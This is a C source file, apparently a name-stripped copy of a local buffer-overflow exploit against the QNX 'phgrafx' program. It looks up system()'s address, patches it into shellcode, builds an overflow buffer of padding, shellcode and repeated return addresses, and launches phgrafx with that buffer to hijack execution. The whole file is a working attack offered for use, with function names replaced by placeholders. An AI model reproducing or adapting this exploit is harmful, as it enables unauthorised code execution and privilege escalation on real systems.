#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  RTLD_LAZY ; 
 int /*<<< orphan*/  _PATH ; 
 int _RET_INIT ; 
 void* FUNC0 (int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC1 (void*,char*) ; 
 int /*<<< orphan*/  FUNC2 (int,char*) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,char*,char*,int /*<<< orphan*/ *) ; 
 int FUNC4 () ; 
 scalar_t__ FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (char*,long*,int) ; 
 int /*<<< orphan*/  FUNC7 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC8 (char*,long) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 char* scode ; 
 int FUNC10 (char*) ; 
 int FUNC11 (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 

int FUNC12 (int argc, char **argv) {

  int i, slen = FUNC10 (scode), offset = 0;
  long ptr, *lptr, addr;
  char *buf;
  void *handle;

  handle = FUNC0 (NULL, RTLD_LAZY);
  addr = (long) FUNC1 (handle, "system");

  for (i = 0; i < 4; i++) {
     char temp = (*((char *) &addr + i) & 0xff);
     if (temp == 0x00 || temp == 0x09 || temp == 0x0a) {
        FUNC9
          ("currently system()'s address contains bytes like 0x00, 0x09 or 0x0a, so it probably won't work since"
           " the application seems to truncate those bytes. BTW you can rely on functions like exec*(), spawn*()"
           " or MsgSend*() to get this working.\n"
           "more at http://www.qnx.org/developers/docs/momentics621_docs/neutrino/lib_ref/");
        return (-1);
     }
  }

  FUNC6((char *)&scode + 0xf, &addr, 4);

  if (argc > 1)
    offset = FUNC11(argv[1], NULL, 0);

  if (!(buf = (char *) FUNC5(1032)))
    FUNC2(1, "malloc()");

  FUNC7(buf, 0, 1032);

  for (i = 0; i < (_RET_INIT - slen); i++)
    buf[i] = 'A'; // inc %ecx

  FUNC8("shellcode length: %d\n", slen);

  for (i = (_RET_INIT - slen); i < _RET_INIT; i++)
    buf[i] = scode[i - (_RET_INIT - slen)];

  lptr = (long *) (buf + _RET_INIT);

  FUNC8("address: 0x%lx\n", ptr = (FUNC4 () - offset));

  for (i = 0; i < ((1024 - _RET_INIT) / 4); i++)
    *(lptr + i) = (int) ptr;

  FUNC3(_PATH, "phgrafx", buf, NULL);

  return (0);
}